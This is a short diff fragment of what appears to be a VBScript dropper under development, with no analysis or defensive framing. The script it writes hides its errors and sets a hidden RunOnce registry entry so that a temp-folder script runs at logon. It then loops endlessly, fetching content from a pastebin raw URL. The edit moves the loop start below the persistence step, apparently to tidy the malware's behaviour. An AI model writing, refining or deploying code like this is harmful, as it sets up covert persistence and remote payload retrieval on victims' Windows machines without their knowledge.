@@ -19,9 +19,9 @@ objFSO.DeleteFile tmpPath
 Set objFile = objFSO.CreateTextFile(tempPath, True)
 
 objFile.WriteLine "On Error Resume Next"
-objFile.WriteLine "Do While True"
 objFile.WriteLine "Set objShell = CreateObject(""WScript.Shell"")"
 objFile.WriteLine "objShell.Run ""reg add """"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"""" /v """"Start"""" /t REG_SZ /d """"%TEMP%\Start.vbs"""" /f"", 0, True"
+objFile.WriteLine "Do While True"
 objFile.WriteLine "Set oHTTP = CreateObject(""MSXML2.XMLHTTP"")"
 objFile.WriteLine "oHTTP.open ""GET"", ""https://pastebin.com/raw/knWXwasC"", False"
 objFile.WriteLine "oHTTP.send"
